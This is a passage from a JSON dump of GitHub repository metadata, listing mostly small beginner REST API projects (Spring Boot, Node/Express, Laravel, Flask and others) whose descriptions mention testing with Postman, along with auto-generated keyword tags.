RESTClient)","fork":false,"created_at":"2019-01-17T19:45:17Z","updated_at":"2019-01-17T19:45:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22307890,"owner_login":"rhabhishek","owner_avatar_url":"https://avatars3.githubusercontent.com/u/22307890?v=4","pulled":1,"tags":["test","application","client","manage"]},{"id":199872772,"name":"laravel-simple-restful-api-crud","full_name":"RMUSMAN/laravel-simple-restful-api-crud","description":"simple restful api crud in laravel tested in postman. validation response in json.","fork":false,"created_at":"2019-07-31T14:31:11Z","updated_at":"2019-07-31T15:58:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32107204,"owner_login":"RMUSMAN","owner_avatar_url":"https://avatars3.githubusercontent.com/u/32107204?v=4","pulled":1,"tags":["test"," postman","rest","json","tested","response","restful","laravel","crud","validation"]},{"id":119902466,"name":"2_2upload_image_restful","full_name":"somraky/2_2upload_image_restful","description":"upload image by restful api. you can use postman for test this.","fork":false,"created_at":"2018-02-01T22:40:32Z","updated_at":"2018-02-01T22:47:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35701342,"owner_login":"somraky","owner_avatar_url":"https://avatars2.githubusercontent.com/u/35701342?v=4","pulled":1,"tags":["test"," postman","rest","load","restful","image","upload"]},{"id":169559184,"name":"RESTful-API","full_name":"jainanant1/RESTful-API","description":"A NodeJS code where the five major (GET,POST,PUT,PATCH,DELETE) requests are written and are tested using POSTMAN.","fork":false,"created_at":"2019-02-07T11:10:54Z","updated_at":"2019-02-07T11:11:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21207431,"owner_login":"jainanant1","owner_avatar_url":"https://avatars2.githubusercontent.com/u/21207431?v=4","pulled":1,"tags":["test","request","requests","code","tested","written","five"]},{"id":168931938,"name":"restful-api","full_name":"Bitcoinera/restful-api","description":"This is a project following the Complete Code Bootcamp 2019 of Angela Yu, using Postman to test different routes","fork":false,"created_at":"2019-02-03T10:08:09Z","updated_at":"2019-05-09T15:26:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40721795,"owner_login":"Bitcoinera","owner_avatar_url":"https://avatars0.githubusercontent.com/u/40721795?v=4","pulled":1,"tags":["test","route","routes","rent","following","2019"]},{"id":67126197,"name":"Restful-API","full_name":"sandeepkumar14/Restful-API","description":"Mean stack API for node JS and mongoDB as database. This api tested in Postman (Chrome app).","fork":false,"created_at":"2016-09-01T11:41:08Z","updated_at":"2016-09-15T09:12:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17603965,"owner_login":"sandeepkumar14","owner_avatar_url":"https://avatars2.githubusercontent.com/u/17603965?v=4","pulled":1,"tags":["test","data","node","database","mongo","tested","stack"]},{"id":196905046,"name":"RestAPIImplementationInSpringBoot","full_name":"dikshachauhan008/RestAPIImplementationInSpringBoot","description":"REST API implementation In Spring Boot, implemented all the crud operations GET,POST, DELETE, PUT in  MVC framework and tested all the services with POSTMAN","fork":false,"created_at":"2019-07-15T01:51:18Z","updated_at":"2019-12-13T11:13:44Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":50563842,"owner_login":"dikshachauhan008","owner_avatar_url":"https://avatars0.githubusercontent.com/u/50563842?v=4","pulled":1,"tags":["test","service","implement","tested","framework","operation","services","operations","implementation","crud","implemented"]},{"id":132424731,"name":"rest-api-playlist","full_name":"olzh2102/rest-api-playlist","description":null,"fork":false,"created_at":"2018-05-07T07:40:06Z","updated_at":"2018-05-07T17:22:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":27337196,"owner_login":"olzh2102","owner_avatar_url":"https://avatars3.githubusercontent.com/u/27337196?v=4","pulled":1,"tags":[]},{"id":120206246,"name":"Mongo_rest_api","full_name":"WingChhun/Mongo_rest_api","description":"Example of a REST api for a sports team with players, will test making endpoint requests using POSTMAN.","fork":false,"created_at":"2018-02-04T17:23:55Z","updated_at":"2018-02-04T17:40:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16395923,"owner_login":"WingChhun","owner_avatar_url":"https://avatars0.githubusercontent.com/u/16395923?v=4","pulled":1,"tags":["test","request","requests","endpoint","play","making","sports"]},{"id":169982266,"name":"restAssuredApiTestFramework","full_name":"hirosht/restAssuredApiTestFramework","description":"Sample framework written for API Testing using RestAssured/TestNg. Project is structured with the maven repo. The sample test cases are pointed to endpoints given from Postman.","fork":false,"created_at":"2019-02-10T13:41:01Z","updated_at":"2019-05-10T12:54:16Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13958097,"owner_login":"hirosht","owner_avatar_url":"https://avatars2.githubusercontent.com/u/13958097?v=4","pulled":1,"tags":["test","repo","endpoint","points","framework","sample","endpoints","written","struct","case","structure","cases","given","maven"]},{"id":139973514,"name":"Spring-Data_Rest","full_name":"MukulJaiswal/Spring-Data_Rest","description":"This Repository contains Restful Api CRUD operations using Spring Data Rest. All API are tested using POSTMAN.","fork":false,"created_at":"2018-07-06T10:59:23Z","updated_at":"2018-07-06T11:01:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30383198,"owner_login":"MukulJaiswal","owner_avatar_url":"https://avatars1.githubusercontent.com/u/30383198?v=4","pulled":1,"tags":["test","contain","tested","operation","operations"]},{"id":249834793,"name":".Net-Core-MVC-REST-Api","full_name":"fisamodo/.Net-Core-MVC-REST-Api","description":"REST Api made using .NET Core, Entity Framework, Microsoft SQL Server Managment Studio and Postman for testing","fork":false,"created_at":"2020-03-24T22:47:27Z","updated_at":"2020-03-25T20:39:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":56238728,"owner_login":"fisamodo","owner_avatar_url":"https://avatars2.githubusercontent.com/u/56238728?v=4","pulled":1,"tags":["test","testing"]},{"id":139970934,"name":"SpringBoot-Jpa-Restful-Api","full_name":"MukulJaiswal/SpringBoot-Jpa-Restful-Api","description":"This Repository contains Restful Api CRUD operations using Spring Boot ,JPA and Hibernate. REST API are tested using POSTMAN.","fork":false,"created_at":"2018-07-06T10:32:28Z","updated_at":"2018-07-25T21:43:20Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":30383198,"owner_login":"MukulJaiswal","owner_avatar_url":"https://avatars1.githubusercontent.com/u/30383198?v=4","pulled":1,"tags":["test","contain","tested","operation","operations"]},{"id":196560034,"name":"RESTful-API","full_name":"caren1/RESTful-API","description":"RESTful application based on Node.js, express.js and mongoose tested with Postman, that allows for adding, listing, deleting and editing all and single articles.  ","fork":false,"created_at":"2019-07-12T10:29:51Z","updated_at":"2019-07-23T07:04:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30754368,"owner_login":"caren1","owner_avatar_url":"https://avatars1.githubusercontent.com/u/30754368?v=4","pulled":1,"tags":["test","application","based","express","mongo"," express","tested","list","allows","mongoose","edit","single","adding","article"]},{"id":37193468,"name":"restful-node","full_name":"AbhieSpeaks/restful-node","description":"A simple Node/Express/Mongoose based REST API for CRUD operations on a local mongodb. These can be tested in Chrome Postman","fork":false,"created_at":"2015-06-10T11:36:28Z","updated_at":"2015-06-10T11:37:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2608084,"owner_login":"AbhieSpeaks","owner_avatar_url":"https://avatars1.githubusercontent.com/u/2608084?v=4","pulled":1,"tags":["test","based","mongo","tested","operation","local","operations","mongod","mongodb"]},{"id":224702498,"name":"SpringBootJSONFileReading","full_name":"Mahalakakshmi/SpringBootJSONFileReading","description":"Reading a JSONObject File and Filtering Objects ,testing using Postman Rest","fork":false,"created_at":"2019-11-28T17:39:01Z","updated_at":"2019-11-28T19:03:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22996277,"owner_login":"Mahalakakshmi","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22996277?v=4","pulled":1,"tags":["test","testing"]},{"id":179158889,"name":"Creating-a-RESTFul-API-With-CRUD-Operations-Using-Flask-and-POSTMAN","full_name":"KrishnaGupta72/Creating-a-RESTFul-API-With-CRUD-Operations-Using-Flask-and-POSTMAN","description":"In this project, We'll show you how to perform CREATE/READ/UPDATE/DELETE requests using Python, Flask and POSTMAN(an API testing app)","fork":false,"created_at":"2019-04-02T21:08:00Z","updated_at":"2019-04-02T21:11:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46058679,"owner_login":"KrishnaGupta72","owner_avatar_url":"https://avatars1.githubusercontent.com/u/46058679?v=4","pulled":1,"tags":["test","testing","request","form","requests","perform"]},{"id":161655015,"name":"rest-api-setup","full_name":"bwainaina380/rest-api-setup","description":"This is practice for setting up a REST API with routes and a server and testing that everything is working using Postman client","fork":false,"created_at":"2018-12-13T15:03:27Z","updated_at":"2018-12-17T12:57:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":38376660,"owner_login":"bwainaina380","owner_avatar_url":"https://avatars3.githubusercontent.com/u/38376660?v=4","pulled":1,"tags":["test","testing","server","client","route","routes","very","working","ever","practice","setting","every"]},{"id":198892046,"name":"springboot-mongodb","full_name":"lekhrajprasad/springboot-mongodb","description":"crud operation using spring boot , mongo db, rest, to test use postman","fork":false,"created_at":"2019-07-25T19:45:44Z","updated_at":"2019-07-28T16:48:15Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30915597,"owner_login":"lekhrajprasad","owner_avatar_url":"https://avatars2.githubusercontent.com/u/30915597?v=4","pulled":1,"tags":["test"," postman","rest","mongo","operation","boot","spring","crud","spring boot"]},{"id":31053659,"name":"restful-db-interface","full_name":"skyupadhya/restful-db-interface","description":"RESTFUL INVENTORY MANAGEMENT SYSTEM: Rest based inventory management system implemented using Bottle (python based) web framework. System testing was done using Postman REST client.","fork":false,"created_at":"2015-02-20T06:27:44Z","updated_at":"2016-10-02T00:42:30Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":11071792,"owner_login":"skyupadhya","owner_avatar_url":"https://avatars2.githubusercontent.com/u/11071792?v=4","pulled":1,"tags":["test","testing","client","based","implement","framework","manage","python","system","management","implemented","done","inventory"]},{"id":248030724,"name":"REST-Project2","full_name":"rdw6297/REST-Project2","description":"A RESTful service written in Java. A WAR file is used to run this service and I used Postman to test it.","fork":false,"created_at":"2020-03-17T17:22:23Z","updated_at":"2020-03-17T17:43:10Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":47403827,"owner_login":"rdw6297","owner_avatar_url":"https://avatars1.githubusercontent.com/u/47403827?v=4","pulled":1,"tags":["test","file","service","written"]},{"id":217190775,"name":"Task-Manager-API","full_name":"git-shashwat/Task-Manager-API","description":"A MongoDB based Task Manager REST API, completely tested with POSTMAN. ✔","fork":false,"created_at":"2019-10-24T02:04:41Z","updated_at":"2020-01-15T20:28:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43851597,"owner_login":"git-shashwat","owner_avatar_url":"https://avatars0.githubusercontent.com/u/43851597?v=4","pulled":1,"tags":["test","based","tested","complete","completely"]},{"id":140914228,"name":"ss-pygre","full_name":"aviskase/ss-pygre","description":"simple & stupid \"rest\" api select caller for PostgreSQL for integration testing via Postman","fork":false,"created_at":"2018-07-14T03:55:21Z","updated_at":"2018-07-14T04:10:09Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3819473,"owner_login":"aviskase","owner_avatar_url":"https://avatars1.githubusercontent.com/u/3819473?v=4","pulled":1,"tags":["test","testing","rest","call","integration","select","\"rest","stupid"]},{"id":116396024,"name":"transaction-service","full_name":"arghajit/transaction-service","description":"A REST application with JAX-RS (Java) hosted in Jetty Server with API tests in POSTMAN","fork":false,"created_at":"2018-01-05T14:58:02Z","updated_at":"2018-10-22T16:50:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":23239074,"owner_login":"arghajit","owner_avatar_url":"https://avatars1.githubusercontent.com/u/23239074?v=4","pulled":1,"tags":["test","tests","application","tests ","host","hosted"]},{"id":134566014,"name":"crudmanagement","full_name":"Nallamachu/crudmanagement","description":"This project has the complete REST API for CRUD operations to test in Postman","fork":false,"created_at":"2018-05-23T12:25:53Z","updated_at":"2019-05-29T11:47:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36003579,"owner_login":"Nallamachu","owner_avatar_url":"https://avatars2.githubusercontent.com/u/36003579?v=4","pulled":1,"tags":["test","operation","operations","complete"]},{"id":116728907,"name":"Level3RESTAPI","full_name":"mohiuddin06617/Level3RESTAPI","description":"This is a Level 3 ASP .Net Web API. I have use Authorization and Authentication to access the action. You can test with api client postman.  ","fork":false,"created_at":"2018-01-08T21:14:43Z","updated_at":"2018-01-08T21:50:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":20150400,"owner_login":"mohiuddin06617","owner_avatar_url":"https://avatars1.githubusercontent.com/u/20150400?v=4","pulled":1,"tags":["test"," postman","client","access","action"]},{"id":163047051,"name":"REST-CarApp","full_name":"Marqueb82/REST-CarApp","description":"REST-Service for car management allowing viewing list of cars, finding by id, updating, deleting and adding new vehicles.  Used Postman for testing of service. ","fork":false,"created_at":"2018-12-25T04:52:25Z","updated_at":"2018-12-25T05:12:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33797265,"owner_login":"Marqueb82","owner_avatar_url":"https://avatars2.githubusercontent.com/u/33797265?v=4","pulled":1,"tags":["test","testing","service","manage","list","view","management","find","updating","adding","vehicles"]},{"id":193544594,"name":"rent-a-movie","full_name":"cerqueiraedu/rent-a-movie","description":"Rent a Movie - an introduction on using Postman for testing REST APIs","fork":false,"created_at":"2019-06-24T16:52:56Z","updated_at":"2019-07-12T17:42:27Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41631585,"owner_login":"cerqueiraedu","owner_avatar_url":"https://avatars1.githubusercontent.com/u/41631585?v=4","pulled":1,"tags":["test","testing","intro","introduction"]},{"id":197017189,"name":"Star-Wars-Planetas","full_name":"raulsantiago/Star-Wars-Planetas","description":"Consulta via Rest Api através de Java Spring Boot + MondoDB, testes realizados com Postman","fork":false,"created_at":"2019-07-15T14:41:25Z","updated_at":"2019-07-15T14:54:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35241597,"owner_login":"raulsantiago","owner_avatar_url":"https://avatars2.githubusercontent.com/u/35241597?v=4","pulled":1,"tags":["test","testes","realiza","realizado"]},{"id":224919349,"name":"UTA_Flask","full_name":"sergeygor/UTA_Flask","description":"Dynamic web apps using Python and Flask, Flask-MongoEngine, Flask-Security, test REST APIs using Postman.","fork":false,"created_at":"2019-11-29T20:39:22Z","updated_at":"2019-12-04T07:30:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14246296,"owner_login":"sergeygor","owner_avatar_url":"https://avatars2.githubusercontent.com/u/14246296?v=4","pulled":1,"tags":["test","web app","apps"]},{"id":193138872,"name":"user-api","full_name":"sverlo/user-api","description":"Simple MVC REST User API + load and API testing (Postman, SoapUI, JMeter)","fork":false,"created_at":"2019-06-21T17:47:21Z","updated_at":"2019-06-23T16:29:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32516435,"owner_login":"sverlo","owner_avatar_url":"https://avatars0.githubusercontent.com/u/32516435?v=4","pulled":1,"tags":["test","testing","load"]},{"id":208447833,"name":"nodeShop","full_name":"mmandryk/nodeShop","description":"NodeJs, ExpressJS, MongoDb, JWT, bCrypt You can test on postman.  Rest Api.","fork":false,"created_at":"2019-09-14T13:56:49Z","updated_at":"2019-09-16T10:16:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44317893,"owner_login":"mmandryk","owner_avatar_url":"https://avatars3.githubusercontent.com/u/44317893?v=4","pulled":1,"tags":["test"," postman"]},{"id":14605209,"name":"REST-Client-for-iPad","full_name":"DilwoarH/REST-Client-for-iPad","description":"(INCOMPLETE) A REST Client for your iPad to help efficiently test your APIs on your iPad :) Note: Inspired By Postman - REST Client (Google Chrome Extension)","fork":false,"created_at":"2013-11-22T01:09:10Z","updated_at":"2016-04-18T09:03:37Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":4599889,"owner_login":"DilwoarH","owner_avatar_url":"https://avatars2.githubusercontent.com/u/4599889?v=4","pulled":1,"tags":["test","help","efficient"]},{"id":80963792,"name":"WebAPI_HW1","full_name":"patriciafig/WebAPI_HW1","description":"The purpose of this assignment is to work with Postman, become familiar with HTTP, and REST through the testing  framework provided by Postman.","fork":false,"created_at":"2017-02-05T02:38:47Z","updated_at":"2017-02-10T05:11:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16803322,"owner_login":"patriciafig","owner_avatar_url":"https://avatars1.githubusercontent.com/u/16803322?v=4","pulled":1,"tags":["test","testing","sign","framework","provide","provided","assignment","familiar","become"]},{"id":144549196,"name":"MongoDB-REST-API-design","full_name":"Bikachu/MongoDB-REST-API-design","description":"This project use MongoDB and REST api to desgin a simple API to implement GET, POST, PUT and DELETE functions, use POSTMAN to test the functions","fork":false,"created_at":"2018-08-13T08:13:46Z","updated_at":"2018-08-13T08:17:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33441984,"owner_login":"Bikachu","owner_avatar_url":"https://avatars3.githubusercontent.com/u/33441984?v=4","pulled":1,"tags":["test","implement","function","functions","desgin"]},{"id":8925825,"name":"grails-simple-app","full_name":"johannescarlen/grails-simple-app","description":"A playaround with Grails. Creating a REST post and get with basic authentication. Also some simple domain class scaffolding. Import the postman.json into Postman for API testing.","fork":false,"created_at":"2013-03-21T09:57:33Z","updated_at":"2013-12-06T12:51:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":688236,"owner_login":"johannescarlen","owner_avatar_url":"https://avatars2.githubusercontent.com/u/688236?v=4","pulled":1,"tags":["test"," postman","testing","json","auth","authentication","play","main","class","around","rails","playaround"]},{"id":199857335,"name":"Rest-APIs","full_name":"ShankeyGupta/Rest-APIs","description":"This is my IBM summer internship project. I used Spring Boot & Jpa to create APIs that show the scenario of college - student Relation. I used Postman as client to test APIs.","fork":false,"created_at":"2019-07-31T13:01:52Z","updated_at":"2019-07-31T13:47:20Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":43706665,"owner_login":"ShankeyGupta","owner_avatar_url":"https://avatars3.githubusercontent.com/u/43706665?v=4","pulled":1,"tags":["test","create","client","intern","student","scenario","college","internship","summer"]},{"id":193361286,"name":"REST-API","full_name":"miladBentaiba/REST-API","description":"- create a REST API for managing contact list (CRUD operation) - use Postman to test your REST API - create a frontend application with react that use this REST API. You can use axios to communicate with the API","fork":false,"created_at":"2019-06-23T14:58:24Z","updated_at":"2019-08-31T17:56:13Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":11270828,"owner_login":"miladBentaiba","owner_avatar_url":"https://avatars2.githubusercontent.com/u/11270828?v=4","pulled":1,"tags":["test","create","application","operation","list","front","react","frontend","communicate","managing","axios","contact"]},{"id":216312388,"name":"React_RestAPI","full_name":"bobkrstic/React_RestAPI","description":"CRUD with React.js and local JSON-Server. Adding books to the library with titles and ratings. Data is stored on a local json server and routes tested with Postman. Check README file for instructions on how to start the app. ","fork":false,"created_at":"2019-10-20T05:29:50Z","updated_at":"2019-10-31T03:15:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17989216,"owner_login":"bobkrstic","owner_avatar_url":"https://avatars1.githubusercontent.com/u/17989216?v=4","pulled":1,"tags":["test","file","server","json","tested","route","local","routes","star","library","start","rating","struct","store","book","books","title","instruction","json server","stored"]},{"id":191482648,"name":"restful-crud-api","full_name":"shetty-shruti/restful-crud-api","description":"A RESTful API performing CRUD(Create,Retrieve,Update,Delete) with Node.js, Express and MongoDB. Mongoose for interacting with the MongoDB instance. Postman is used to test these endpoints.","fork":false,"created_at":"2019-06-12T02:27:56Z","updated_at":"2019-06-12T02:32:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32474614,"owner_login":"shetty-shruti","owner_avatar_url":"https://avatars3.githubusercontent.com/u/32474614?v=4","pulled":1,"tags":["test","form","endpoint","points","endpoints","interact","perform","interacting","instance","performing"]},{"id":162643106,"name":"REST-employeeApp","full_name":"Marqueb82/REST-employeeApp","description":"RESTful web service created using spring and tested with Postman.  Uses general get and post requests for mapping and service will allow user to add, remove, view all and view specific employess based upon their ID.","fork":false,"created_at":"2018-12-20T23:50:03Z","updated_at":"2019-02-06T05:53:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33797265,"owner_login":"Marqueb82","owner_avatar_url":"https://avatars2.githubusercontent.com/u/33797265?v=4","pulled":1,"tags":["test","create","request","service","requests","user","based","tested","spec","view","spring","specific","general","upon"]},{"id":65252456,"name":"simpleRestAPI","full_name":"zenithtekla/simpleRestAPI","description":"RestAPI made simple, tested with Advanced REST client chromeApp, offered by chromerestclient.com, this App is much simpler, fast and light to perform testing than clumsy, complex Postman UI","fork":false,"created_at":"2016-08-09T01:32:23Z","updated_at":"2016-08-12T16:00:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11691367,"owner_login":"zenithtekla","owner_avatar_url":"https://avatars1.githubusercontent.com/u/11691367?v=4","pulled":1,"tags":["test","testing","form","rest","client","tested","perform","light","chrome","complex","offered","restclient","much"]},{"id":187154511,"name":"Simple-REST-APIs","full_name":"hwu39/Simple-REST-APIs","description":"This is a simple test to view the fundamentals of RESTful APIs in interaction with MongoDB. The RESTful APIs (including GET, POST, PUT, PATCH, DELETE) can be tested through Postman on a local machine.","fork":false,"created_at":"2019-05-17T05:51:20Z","updated_at":"2019-05-17T05:51:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22501559,"owner_login":"hwu39","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22501559?v=4","pulled":1,"tags":["test","tested","local","interact","view","action","including","machine","interaction","fundamental","fundamentals"]},{"id":92599490,"name":"Create-order-using-oauth-rest-api-in-android","full_name":"tarang777/Create-order-using-oauth-rest-api-in-android","description":"Order not getting created with android app using rest api, but it works well with the postman ie rest api testing tool.","fork":false,"created_at":"2017-05-27T13:11:51Z","updated_at":"2017-05-27T13:11:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":20734635,"owner_login":"tarang777","owner_avatar_url":"https://avatars1.githubusercontent.com/u/20734635?v=4","pulled":1,"tags":["test"," postman","create","testing","rest","tool","rest api","getting","android"]},{"id":155590238,"name":"twitter-rest-api","full_name":"coderIlluminatus/twitter-rest-api","description":"Twitter-like Rest API based on Node.js and tests using Chai and Mocha","fork":false,"created_at":"2018-10-31T16:33:57Z","updated_at":"2019-07-05T15:54:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16795028,"owner_login":"coderIlluminatus","owner_avatar_url":"https://avatars0.githubusercontent.com/u/16795028?v=4","pulled":1,"tags":["test","tests","tests ","based"]},{"id":108209173,"name":"J2EE-Maven-Project","full_name":"Santoshrt999/J2EE-Maven-Project","description":"Passing simple data to REST API's (Use Google's Postman App, to test the data) also SpringBoot Framework","fork":false,"created_at":"2017-10-25T02:27:29Z","updated_at":"2017-10-25T02:45:52Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21988771,"owner_login":"Santoshrt999","owner_avatar_url":"https://avatars2.githubusercontent.com/u/21988771?v=4","pulled":1,"tags":["test","data"]},{"id":200635059,"name":"basic-api-with-react-django","full_name":"YoLoADR/basic-api-with-react-django","description":"We will setup a Django app and create a REST API with the Django Rest Framework. We will use Postman for API testing.","fork":false,"created_at":"2019-08-05T10:34:54Z","updated_at":"2019-08-05T10:34:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16499678,"owner_login":"YoLoADR","owner_avatar_url":"https://avatars1.githubusercontent.com/u/16499678?v=4","pulled":1,"tags":["test","create","testing","setup"]},{"id":221910866,"name":"DevOpsTutorial","full_name":"skoulouzis/DevOpsTutorial","description":"Define a simple REST API with OpenAPI and Swagger, write REST API tests using Postman, develop the application logic, dockerize it and finally perform continuous integration (CI) ","fork":false,"created_at":"2019-11-15T11:30:15Z","updated_at":"2019-11-25T12:12:51Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":9680609,"owner_login":"skoulouzis","owner_avatar_url":"https://avatars2.githubusercontent.com/u/9680609?v=4","pulled":1,"tags":["test","form","tests","application","tests ","develop","integration","perform","docker","write","final","continuous"]},{"id":183835488,"name":"partNumberGenerator","full_name":"painfulcranium/partNumberGenerator","description":"A sample Demo application with an angular front end, a grails REST API, and a postman collection to test with","fork":false,"created_at":"2019-04-28T00:45:58Z","updated_at":"2019-04-29T13:54:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":5238279,"owner_login":"painfulcranium","owner_avatar_url":"https://avatars0.githubusercontent.com/u/5238279?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection","application","sample","front","front end","angular","rails","grails"]},{"id":81371954,"name":"EmployeeCRUD-Spring-MVC-Hibernate","full_name":"Ajinkyashinde15/EmployeeCRUD-Spring-MVC-Hibernate","description":"I have created web services REST API using Spring Web MVC framework with Hibernate technology. Postman used to tested and constructed requests to REST API .","fork":false,"created_at":"2017-02-08T20:19:11Z","updated_at":"2017-02-08T21:07:26Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":11631994,"owner_login":"Ajinkyashinde15","owner_avatar_url":"https://avatars0.githubusercontent.com/u/11631994?v=4","pulled":1,"tags":["test","create","request","service","requests","tested","framework","services","struct","tech","technology","constructed"]},{"id":96149063,"name":"WebAPI-MongoDB","full_name":"cristiankruger/WebAPI-MongoDB","description":"Construção de uma API REST em c# persistindo em mongoDB com testes feitos através do Xunit e POSTMAN.","fork":false,"created_at":"2017-07-03T20:44:22Z","updated_at":"2017-07-08T18:11:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26773420,"owner_login":"cristiankruger","owner_avatar_url":"https://avatars3.githubusercontent.com/u/26773420?v=4","pulled":1,"tags":["test","mongo","testes","unit","persistindo"]},{"id":108623660,"name":"westjet_test","full_name":"OlgaDery/westjet_test","description":"Spring Boot micro service with 3 REST APIs. May be deployed locally or on AWS. Postman tests included.","fork":false,"created_at":"2017-10-28T05:55:12Z","updated_at":"2018-04-05T17:30:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19338310,"owner_login":"OlgaDery","owner_avatar_url":"https://avatars1.githubusercontent.com/u/19338310?v=4","pulled":1,"tags":["test","tests","service","tests ","call","local","micro","deployed","included","locally"]},{"id":191698993,"name":"REST-API","full_name":"cmullins777/REST-API","description":"A school database where registered users can retrieve, add, update, and delete courses in the database. This project uses REST API design, Node.js, and Express to create API routes, and the Sequelize ORM for data modeling, validation, and persistence, as well as Postman for testing.","fork":false,"created_at":"2019-06-13T05:50:42Z","updated_at":"2019-11-18T23:55:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15165828,"owner_login":"cmullins777","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15165828?v=4","pulled":1,"tags":["test","create","data","testing","database","user","sign","route","routes","users","update","course","delete","uses","model","design","validation","retrieve","register","persistence","school","modeling"]},{"id":161524341,"name":"php_oop_rest_api","full_name":"brankozecevic/php_oop_rest_api","description":"This is a REST API using PHP and OOP principles. There is also MySQL database that you can use to import on your server (myblog.sql). This REST API is based on CRUD functionality (blog posts and blog categories). For testing use Postman app environment as a REST client.","fork":false,"created_at":"2018-12-12T17:45:29Z","updated_at":"2018-12-12T17:53:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45066671,"owner_login":"brankozecevic","owner_avatar_url":"https://avatars2.githubusercontent.com/u/45066671?v=4","pulled":1,"tags":["test","data","testing","server","client","database","based","environment","function","import","functional","functionality","blog","posts","principles"]},{"id":134580554,"name":"node-countries-light-app","full_name":"bflaven/node-countries-light-app","description":"Node, API, Postman - Build a simple but complete REST API with Node, tested made with Chai and Newman, documented with Apidoc","fork":false,"created_at":"2018-05-23T14:19:19Z","updated_at":"2018-05-29T11:43:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":5916084,"owner_login":"bflaven","owner_avatar_url":"https://avatars2.githubusercontent.com/u/5916084?v=4","pulled":1,"tags":["test","document","tested","complete","documented"]},{"id":190715549,"name":"ticket-viewer","full_name":"SeepG/ticket-viewer","description":"Javascript Ticket Viewer built using a simple REST API with NodeJS and Express. PostMan has been used for testing. HTML, Javascript and Bootstrap used for the 